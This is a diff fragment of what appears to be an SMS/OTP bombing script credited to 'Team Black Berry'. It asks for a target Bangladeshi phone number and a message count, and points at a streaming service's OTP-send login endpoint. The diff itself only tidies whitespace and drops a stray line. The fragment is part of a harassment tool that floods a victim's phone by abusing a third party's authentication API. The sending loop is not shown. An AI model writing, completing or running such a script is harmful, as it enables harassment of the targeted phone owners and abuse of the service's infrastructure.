@@ -13,12 +13,11 @@ print("""
   Facebook : https://www.facebook.com/profile.php?id=100074238783251
   CO: Team Black Berry
  
+
   """)                                                        
 number=str(input("Enter Terget Number:+88 "))
 amount=int(input("Enter Terget Amount: "))
 url = "https://ss.binge.buzz/otp/send/login"
-
-clear
 
 headers = CaseInsensitiveDict()
 headers["Content-Type"] = "application/x-www-form-urlencoded"
